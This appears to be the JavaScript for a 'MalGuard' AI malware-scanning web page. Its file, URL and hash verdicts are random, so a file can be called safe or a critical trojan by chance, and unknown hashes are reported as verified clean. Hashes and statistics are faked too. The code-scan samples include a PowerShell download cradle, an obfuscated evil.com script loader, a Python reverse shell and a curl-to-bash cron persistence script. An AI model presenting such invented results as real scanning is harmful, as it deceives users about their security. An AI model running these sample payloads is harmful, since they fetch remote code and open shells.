// ===== STATE =====
let selFile = null;
let currentResult = null;
let lightMode = false;
let scanCounter = 1284902;

// ===== THEME =====
function toggleTheme(){
  lightMode = !lightMode;
  document.body.classList.toggle('light', lightMode);
  document.querySelector('.theme-btn').textContent = lightMode ? '🌙' : '☀';
}

// ===== NAV =====
function showPage(id, el){
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.ntab').forEach(t => t.classList.remove('active'));
  document.getElementById('page-'+id).classList.add('active');
  el.classList.add('active');
  if(id === 'howitworks') setTimeout(animateBars, 300);
  if(id === 'threatintel'){ setTimeout(animateFamilyBars, 300); buildMitreGrid(); }
}

// ===== TABS =====
function switchTab(el, id){
  document.querySelectorAll('.chtab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
  el.classList.add('active');
  document.getElementById('tab-'+id).classList.add('active');
  document.getElementById('progArea').classList.remove('show');
  document.getElementById('resultArea').classList.remove('show');
}

function toggleOpt(el){
  el.classList.toggle('selected');
}

// ===== FILE HELPERS =====
function getIcon(n){
  const e = (n.split('.').pop()||'').toLowerCase();
  return {pdf:'📋',exe:'⚙️',dll:'⚙️',docx:'📝',doc:'📝',xlsx:'📊',
    zip:'🗜️',rar:'🗜️',apk:'📱',msi:'💾',js:'📜',py:'🐍',sh:'📜',
    ps1:'📜',bat:'📜',vbs:'📜',jar:'☕',dmg:'🍎',iso:'💿',txt:'📄'}[e]||'📄';
}
function fmtSize(b){
  if(b<1024) return b+' B';
  if(b<1048576) return (b/1024).toFixed(1)+' KB';
  return (b/1048576).toFixed(1)+' MB';
}
function fakeMD5(name){
  let h = 0;
  for(let i=0;i<name.length;i++) h = Math.imul(31,h)+name.charCodeAt(i)|0;
  return Math.abs(h).toString(16).padStart(8,'0').repeat(4).substring(0,32);
}

// ===== DRAG & DROP =====
function onDrag(e){ e.preventDefault(); document.getElementById('dropZone').classList.add('drag'); }
function onDragLeave(){ document.getElementById('dropZone').classList.remove('drag'); }
function onDrop(e){ e.preventDefault(); onDragLeave(); const f=e.dataTransfer.files[0]; if(f) setFile(f); }
function onFileSelect(e){ const f=e.target.files[0]; if(f) setFile(f); }

function setFile(f){
  selFile = f;
  document.getElementById('ficon').textContent = getIcon(f.name);
  document.getElementById('fname').textContent = f.name;
  document.getElementById('fsize').textContent = fmtSize(f.size);
  document.getElementById('fhash').textContent = 'MD5: '+fakeMD5(f.name);
  document.getElementById('fileRow').classList.add('show');
  document.getElementById('scanBtn').disabled = false;
  document.getElementById('resultArea').classList.remove('show');
  document.getElementById('progArea').classList.remove('show');
}
function removeFile(){
  selFile = null;
  document.getElementById('fileInput').value = '';
  document.getElementById('fileRow').classList.remove('show');
  document.getElementById('scanBtn').disabled = true;
}

// ===== SCAN =====
const STEPS = [
  {id:'s1',label:'Static analysis — parsing file structure & headers…',pct:18},
  {id:'s2',label:'NLP tokenization — encoding API call sequences…',pct:38},
  {id:'s3',label:'AI ensemble inference — 5 models voting in parallel…',pct:62},
  {id:'s4',label:'Signature matching — querying 2.3M threat database…',pct:84},
  {id:'s5',label:'Compiling threat report & extracting IOC artifacts…',pct:100},
];

function startScan(){
  if(!selFile) return;
  document.getElementById('scanBtn').disabled = true;
  document.getElementById('scanBtn').closest('.scan-controls').style.display='none';
  document.getElementById('progArea').classList.add('show');
  document.getElementById('resultArea').classList.remove('show');
  STEPS.forEach(s => { const el=document.getElementById(s.id); el.classList.remove('active','done'); });
  let idx=0;
  function run(){
    if(idx >= STEPS.length){ setTimeout(()=>showResult(), 400); return; }
    const s = STEPS[idx];
    if(idx>0) document.getElementById(STEPS[idx-1].id).classList.replace('active','done');
    document.getElementById(s.id).classList.add('active');
    document.getElementById('progLabel').textContent = s.label;
    document.getElementById('progPct').textContent = s.pct+'%';
    document.getElementById('progFill').style.width = s.pct+'%';
    idx++;
    setTimeout(run, 600+Math.random()*300);
  }
  run();
}

function showResult(){
  document.getElementById(STEPS[STEPS.length-1].id).classList.replace('active','done');
  document.getElementById('progArea').classList.remove('show');
  document.getElementById('scanBtn').closest('.scan-controls').style.display='';
  scanCounter += Math.floor(Math.random()*3)+1;
  document.getElementById('statScans').textContent = scanCounter.toLocaleString();

  const outcomes = [
    {
      type:'safe',icon:'✅',verdict:'File is Safe to Open',
      explain:'All 5 AI models completed independent analysis and found zero threats. File structure, entropy, and API patterns all appear legitimate.',
      risk:Math.floor(Math.random()*12)+1,
      checks:[
        {i:'🔎',l:'File Type',v:'Verified match',c:'safe'},
        {i:'🤖',l:'AI Verdict',v:'Clean — 5/5 models',c:'safe'},
        {i:'📋',l:'Threat DB',v:'Not in 2.3M+ DB',c:'safe'},
        {i:'📊',l:'Entropy',v:'Normal distribution',c:'safe'},
      ],
      findings:[],iocs:[],
    },
    {
      type:'danger',icon:'🚨',verdict:'DANGER — Critical Threat Detected',
      explain:'Ensemble detected strong malware indicators with 97% confidence. Delete immediately and scan your system for lateral movement.',
      risk:Math.floor(Math.random()*12)+88,
      checks:[
        {i:'🔎',l:'File Type',v:'Disguised executable',c:'danger'},
        {i:'🤖',l:'AI Verdict',v:'Trojan — 97% confidence',c:'danger'},
        {i:'📋',l:'Threat DB',v:'Matches LockBit 4.0',c:'danger'},
        {i:'📊',l:'Entropy',v:'High — packed/encrypted',c:'danger'},
      ],
      findings:[
        {lvl:'high',n:'Trojan.Win32.Dropper',d:'Silently installs secondary malware on execution. Detected via BERT model API call pattern matching.'},
        {lvl:'high',n:'Credential Stealer',d:'Reads browser cookie stores and saved password vaults, exfiltrates to remote C2 at 185.220.x.x.'},
        {lvl:'medium',n:'Anti-Analysis Evasion',d:'Uses packing and code obfuscation to evade signature scanners — detected via entropy analysis (score: 7.94).'},
      ],
      iocs:[
        {type:'IP',val:'185.220.101.72',sev:'high'},
        {type:'Domain',val:'update-service-cdn.com',sev:'high'},
        {type:'Registry',val:'HKCU\\Run\\svchost32',sev:'medium'},
        {type:'Mutex',val:'Global\\{a1b2c3d4}',sev:'medium'},
      ],
    },
    {
      type:'warning',icon:'⚡',verdict:'Suspicious — Open With Caution',
      explain:'Unusual patterns detected below critical threshold. Verify the source before opening. Manual review recommended.',
      risk:Math.floor(Math.random()*18)+48,
      checks:[
        {i:'🔎',l:'File Type',v:'Unusual structure',c:'warn'},
        {i:'🤖',l:'AI Verdict',v:'Suspicious — 63% conf.',c:'warn'},
        {i:'📋',l:'Threat DB',v:'Unknown, anomalous',c:'neutral'},
        {i:'📊',l:'Entropy',v:'Elevated — 6.8',c:'warn'},
      ],
      findings:[
        {lvl:'medium',n:'Obfuscated Packing',d:'Compression methods commonly associated with malware concealment — detected via entropy scoring.'},
        {lvl:'low',n:'Unverified Network Calls',d:'May contact external servers on execution. Flagged as low risk — some legitimate software behaves similarly.'},
      ],
      iocs:[
        {type:'Domain',val:'cdn-assets-update.net',sev:'medium'},
        {type:'URL',val:'http://109.234.x.x/payload',sev:'low'},
      ],
    },
  ];

  const r = outcomes[Math.floor(Math.random()*outcomes.length)];
  currentResult = r;

  // Banner
  const banner = document.getElementById('rbanner');
  banner.className = 'rbanner '+r.type+' fade-in';
  document.getElementById('ricon').textContent = r.icon;
  document.getElementById('rverdict').textContent = r.verdict;
  document.getElementById('rexplain').textContent = r.explain;

  // Risk
  const riskColor = r.type==='safe'?'#00e5a0':r.type==='warning'?'#ffb340':'#ff4567';
  document.getElementById('riskNum').textContent = r.risk+' / 100 — '+(r.type==='safe'?'Clean':r.type==='warning'?'Caution':'Critical');
  document.getElementById('riskNum').style.color = riskColor;
  const fill = document.getElementById('riskFill');
  fill.className = 'risk-fill '+r.type;
  setTimeout(()=>fill.style.width=r.risk+'%', 100);

  // Checks
  document.getElementById('checksGrid').innerHTML = r.checks.map(c=>
    `<div class="check-card"><div class="cc-icon">${c.i}</div><div><div class="cc-lbl">${c.l}</div><div class="cc-val ${c.c}">${c.v}</div></div></div>`
  ).join('');

  // Findings
  const fs = document.getElementById('findingsSection');
  if(r.findings.length){
    fs.style.display='block';
    document.getElementById('findingsCount').textContent = r.findings.length+' found';
    document.getElementById('findingsList').innerHTML = r.findings.map(f=>
      `<div class="finding"><div class="f-bar ${f.lvl}"></div><div class="f-body"><div class="f-name">${f.n}</div><div class="f-desc">${f.d}</div></div><div class="f-badge ${f.lvl}">${f.lvl.toUpperCase()}</div></div>`
    ).join('');
  } else fs.style.display='none';

  // IOCs
  const iocSec = document.getElementById('iocSection');
  if(r.iocs && r.iocs.length){
    iocSec.style.display='block';
    document.getElementById('iocBody').innerHTML = r.iocs.map(ioc=>
      `<tr><td><span class="ioc-type">${ioc.type}</span></td><td>${ioc.val}</td><td><span class="ioc-sev ${ioc.sev}">${ioc.sev.toUpperCase()}</span></td></tr>`
    ).join('');
  } else iocSec.style.display='none';

  document.getElementById('resultArea').classList.add('show');
  addRecent(selFile.name, fmtSize(selFile.size), r.type);
}

function resetScan(){
  removeFile();
  document.getElementById('resultArea').classList.remove('show');
  document.getElementById('progArea').classList.remove('show');
  document.getElementById('progFill').style.width = '0%';
  document.getElementById('scanBtn').closest('.scan-controls').style.display='';
  document.getElementById('scanBtn').disabled = true;
}

function addRecent(name, size, type){
  const badges={safe:'<div class="ri-badge safe">Safe</div>',warning:'<div class="ri-badge warning">Suspicious</div>',danger:'<div class="ri-badge danger">Threat</div>'};
  const div = document.createElement('div');
  div.className = 'recent-item fade-in';
  div.innerHTML = `<div class="ri-icon">${getIcon(name)}</div><div class="ri-info"><div class="ri-name">${name}</div><div class="ri-meta">Just now · ${size}</div></div>${badges[type]}`;
  document.getElementById('recentList').prepend(div);
}

// ===== URL SCAN =====
function startUrlScan(){
  const url = document.getElementById('urlInput').value.trim();
  if(!url) return;
  const d = document.getElementById('urlResult');
  d.style.display = 'block';
  d.innerHTML = spinner('Analyzing URL with threat intelligence feeds…');
  setTimeout(()=>{
    const score = Math.random();
    if(score < 0.3){
      d.innerHTML = bannerHtml('danger','🚨','Dangerous URL — Do NOT Visit','This domain appears in our phishing and malware distribution database. It is currently serving malicious content.');
    } else if(score < 0.5){
      d.innerHTML = bannerHtml('warning','⚠️','Suspicious Domain','Domain reputation is poor and it was recently registered. Proceed with extreme caution.');
    } else {
      d.innerHTML = bannerHtml('safe','✅','URL Appears Safe','No known threats linked to this domain. Domain reputation is good and no active threat indicators found.');
    }
  }, 2000);
}

// ===== HASH LOOKUP =====
function setHashExample(type){
  const examples = {
    md5:'d8e8fca2dc0f896fd7cb4cb0031ba249',
    sha1:'adc83b19e793491b1c6ea0fd8b46cd9f32e592fc',
    sha256:'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
  };
  document.getElementById('hashInput').value = examples[type];
}

function startHashLookup(){
  const h = document.getElementById('hashInput').value.trim();
  if(!h) return;
  const d = document.getElementById('hashResult');
  d.style.display = 'block';
  d.innerHTML = spinner('Searching 2.3M+ threat database…');
  setTimeout(()=>{
    const known = h.length >= 64;
    if(known && Math.random()<0.3){
      d.innerHTML = bannerHtml('danger','🚨','Known Malware Hash','This file fingerprint matches Trojan.Win32.AgentTesla in our threat database. File is confirmed malicious.');
    } else {
      d.innerHTML = bannerHtml('safe','✅','Hash Confirmed Clean','This file fingerprint is in our database and has been verified safe by our security team.');
    }
  }, 1600);
}

// ===== CODE SCAN =====
const CODE_EXAMPLES = {
  ps:`# PowerShell — suspicious download cradle
$url = "http://malicious-host.ru/payload.exe"
$path = "$env:TEMP\\svchost32.exe"
(New-Object Net.WebClient).DownloadFile($url, $path)
Start-Process $path -WindowStyle Hidden`,
  js:`// JavaScript obfuscated dropper
eval(atob('ZG9jdW1lbnQud3JpdGUoJzxzY3JpcHQgc3JjPSJodHRwczovL2V2aWwuY29tL3BheWxvYWQuanMiPjwvc2NyaXB0PicpOw=='));`,
  py:`import subprocess, base64, socket
c2 = "185.220.101.72"; port = 4444
while True:
    s=socket.socket(); s.connect((c2,port))
    cmd=s.recv(1024).decode(); out=subprocess.getoutput(cmd)
    s.send(out.encode())`,
  bash:`#!/bin/bash
curl -s http://update-cdn.net/install.sh | bash
crontab -l > /tmp/ct; echo "*/5 * * * * curl -s http://c2.evil.io/check" >> /tmp/ct
crontab /tmp/ct`,
};
function loadCodeExample(type){ document.getElementById('codeInput').value = CODE_EXAMPLES[type]; }

function startCodeScan(){
  const code = document.getElementById('codeInput').value.trim();
  if(!code) return;
  const d = document.getElementById('codeResult');
  d.style.display = 'block';
  d.innerHTML = spinner('Running NLP analysis on code…');
  // Simple heuristic scoring
  const suspicious = ['eval','atob','base64','exec','subprocess','curl','wget','nc ','ncat',
    'powershell','invoke','downloadfile','webclient','socket','connect','reverse','shell'];
  const hits = suspicious.filter(w => code.toLowerCase().includes(w));
  setTimeout(()=>{
    if(hits.length >= 3){
      d.innerHTML = bannerHtml('danger','🚨','Highly Suspicious Code',`Detected ${hits.length} malicious indicators: ${hits.slice(0,4).join(', ')}. Pattern matches known RAT/dropper behaviors.`);
    } else if(hits.length >= 1){
      d.innerHTML = bannerHtml('warning','⚡','Code Contains Suspicious Patterns',`Detected patterns: ${hits.join(', ')}. Manual review recommended before execution.`);
    } else {
      d.innerHTML = bannerHtml('safe','✅','No Malicious Patterns Found','Code appears clean. No known malicious APIs, obfuscation techniques, or suspicious patterns detected.');
    }
  }, 1800);
}

// ===== REPORT ACTIONS =====
function downloadReport(){
  if(!currentResult || !selFile) return;
  const t = new Date().toISOString();
  const lines = [
    '=== MALGUARD SECURITY REPORT ===',
    `File: ${selFile.name}`,
    `Size: ${fmtSize(selFile.size)}`,
    `MD5: ${fakeMD5(selFile.name)}`,
    `Scan Time: ${t}`,
    `Verdict: ${currentResult.verdict}`,
    `Risk Score: ${currentResult.risk}/100`,
    `Type: ${currentResult.type.toUpperCase()}`,
    '',
    '--- DETECTION CHECKS ---',
    ...currentResult.checks.map(c=>`${c.l}: ${c.v}`),
    '',
    '--- FINDINGS ---',
    ...(currentResult.findings.length ? currentResult.findings.map(f=>`[${f.lvl.toUpperCase()}] ${f.n}: ${f.d}`) : ['No threats found']),
    '',
    '--- IOC ARTIFACTS ---',
    ...(currentResult.iocs&&currentResult.iocs.length ? currentResult.iocs.map(i=>`${i.type}: ${i.val} (${i.sev})`) : ['None']),
    '',
    'Generated by MalGuard AI Security Platform',
  ];
  const blob = new Blob([lines.join('\n')],{type:'text/plain'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = `malguard-report-${selFile.name.replace(/\s/g,'_')}.txt`;
  a.click();
  showNotif('Report downloaded!','success');
}

function copyReport(){
  if(!currentResult) return;
  const txt = `MalGuard Report — ${selFile.name}\nVerdict: ${currentResult.verdict}\nRisk: ${currentResult.risk}/100\nType: ${currentResult.type.toUpperCase()}`;
  navigator.clipboard.writeText(txt).then(()=>showNotif('Copied to clipboard!','success')).catch(()=>showNotif('Copy failed','error'));
}

// ===== UTILITIES =====
function spinner(msg){
  return `<div style="display:flex;align-items:center;gap:10px;padding:12px 14px;border-radius:9px;background:rgba(255,255,255,.02);border:1px solid var(--b1);font-size:12px;color:var(--t2)"><div style="width:12px;height:12px;border:1.5px solid rgba(79,127,255,.2);border-top-color:var(--blue);border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0"></div>${msg}</div>`;
}
function bannerHtml(type, icon, verdict, explain){
  return `<div class="rbanner ${type} fade-in"><div class="r-icon">${icon}</div><div><div class="r-verdict">${verdict}</div><div class="r-explain">${explain}</div></div></div>`;
}

function showNotif(msg, type='info'){
  const n = document.createElement('div');
  n.className = `notification ${type}`;
  n.innerHTML = `${type==='success'?'✓':type==='error'?'✗':'ℹ'} ${msg}`;
  document.body.appendChild(n);
  setTimeout(()=>n.remove(), 3000);
}

// ===== MODEL BARS =====
function animateBars(){
  document.querySelectorAll('.mbar-fill').forEach(b=>{
    b.style.width = '0%';
    requestAnimationFrame(()=>setTimeout(()=>b.style.width=b.dataset.w+'%', 50));
  });
}

// ===== FAMILY BARS (threat intel) =====
function animateFamilyBars(){
  document.querySelectorAll('.fi-bar-fill').forEach(b=>{
    b.style.width = '0%';
    requestAnimationFrame(()=>setTimeout(()=>b.style.width=b.dataset.w+'%', 50));
  });
}

// ===== MITRE GRID =====
const MITRE_TACTICS = [
  {name:'Recon',count:124,color:'#4f7fff',sub:'TA0043'},
  {name:'Resource Dev',count:89,color:'#4f7fff',sub:'TA0042'},
  {name:'Initial Access',count:341,color:'#7c5cfc',sub:'TA0001'},
  {name:'Execution',count:287,color:'#7c5cfc',sub:'TA0002'},
  {name:'Persistence',count:198,color:'#ffb340',sub:'TA0003'},
  {name:'Privilege Esc',count:156,color:'#ffb340',sub:'TA0004'},
  {name:'Defense Evasion',count:412,color:'#ff4567',sub:'TA0005'},
  {name:'Cred Access',count:302,color:'#ff4567',sub:'TA0006'},
  {name:'Discovery',count:221,color:'#ffb340',sub:'TA0007'},
  {name:'Lateral Move',count:134,color:'#7c5cfc',sub:'TA0008'},
  {name:'Collection',count:178,color:'#00d4ff',sub:'TA0009'},
  {name:'C2',count:256,color:'#ff4567',sub:'TA0011'},
  {name:'Exfiltration',count:189,color:'#ff4567',sub:'TA0010'},
  {name:'Impact',count:143,color:'#ffb340',sub:'TA0040'},
  {name:'Discovery',count:92,color:'#00d4ff',sub:'TA0007'},
  {name:'Defense Bypass',count:317,color:'#ff4567',sub:'TA0005'},
  {name:'Injection',count:204,color:'#7c5cfc',sub:'T1055'},
  {name:'Obfuscation',count:261,color:'#ffb340',sub:'T1027'},
];
function buildMitreGrid(){
  const g = document.getElementById('mitreGrid');
  if(g.innerHTML) return;
  g.innerHTML = MITRE_TACTICS.map(t=>{
    const alpha = Math.min(0.25, (t.count/500)*0.3+0.05);
    return `<div class="mitre-cell" style="background:rgba(${hexToRgb(t.color)},${alpha.toFixed(2)});border-color:rgba(${hexToRgb(t.color)},${(alpha*2).toFixed(2)})" title="${t.sub}">
      <div class="mitre-cell-count" style="color:${t.color}">${t.count}</div>
      <div class="mitre-cell-name">${t.name}</div>
      <div class="mitre-cell-sub">${t.sub}</div>
    </div>`;
  }).join('');
}
function hexToRgb(hex){
  const r=parseInt(hex.slice(1,3),16),g=parseInt(hex.slice(3,5),16),b=parseInt(hex.slice(5,7),16);
  return `${r},${g},${b}`;
}

// ===== WORLD MAP =====
function buildWorldMap(){
  const map = document.getElementById('worldMap');
  const nodes = [
    {x:15,y:35,c:'critical'},{x:22,y:42,c:'high'},{x:48,y:28,c:'critical'},
    {x:52,y:32,c:'high'},{x:55,y:22,c:'medium'},{x:68,y:38,c:'critical'},
    {x:72,y:30,c:'high'},{x:80,y:25,c:'medium'},{x:85,y:45,c:'high'},
    {x:75,y:60,c:'critical'},{x:30,y:55,c:'high'},{x:38,y:48,c:'medium'},
    {x:60,y:50,c:'high'},{x:10,y:50,c:'medium'},{x:90,y:55,c:'high'},
  ];
  const colors = {critical:'#ff4567',high:'#ffb340',medium:'#00d4ff'};
  nodes.forEach(n=>{
    const el = document.createElement('div');
    el.className = 'map-node';
    el.style.cssText = `left:${n.x}%;top:${n.y}%;background:${colors[n.c]};color:${colors[n.c]}`;
    map.appendChild(el);
  });
}

// ===== RESEARCH FILTER =====
function filterPapers(tag, el){
  document.querySelectorAll('.rf-item').forEach(i=>i.classList.remove('active'));
  el.classList.add('active');
  document.querySelectorAll('.paper-card').forEach(c=>{
    c.style.display = (tag==='all'||c.dataset.tags.includes(tag)) ? 'block' : 'none';
  });
}

// ===== LIVE COUNTER ANIMATION =====
function animateScanCounter(){
  setInterval(()=>{
    if(Math.random()<0.4){
      scanCounter += Math.floor(Math.random()*3)+1;
      const el = document.getElementById('statScans');
      if(el) el.textContent = scanCounter.toLocaleString();
    }
  }, 2500);
}

// ===== INIT =====
buildWorldMap();
animateScanCounter();